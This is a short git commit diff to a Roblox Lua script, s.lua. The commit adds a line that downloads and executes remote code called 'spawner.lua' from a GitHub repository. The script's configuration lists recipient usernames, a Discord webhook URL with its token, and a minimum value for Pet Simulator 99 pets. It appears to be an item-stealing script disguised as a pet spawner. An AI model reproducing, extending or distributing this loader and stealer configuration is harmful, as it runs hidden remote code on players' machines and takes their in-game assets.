87a24e4f3cfdc27e56dc66b18c6703c71d4f68d8
skullsidk-prog <skullsidk@gmail.com>
2025-12-21 16:18:23 -0500

    Update s.lua

--- s.lua
+++ s.lua
@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/skullsidk-prog/adm/refs/heads/main/spawner.lua", true))()
+
 Username = {"qusay52VxWi","ajandaa12"} 
 Webhook = "https://discord.com/api/webhooks/1394673795377270804/MivmTd8U5V-lGyGhBeBy-woMHFcFf0QX86Wdafs-AYSDFkkkl4EgQsl6Oj9T1ol1Oory" 
 min_rap = 10000 --for pets go and pet simulator 99 
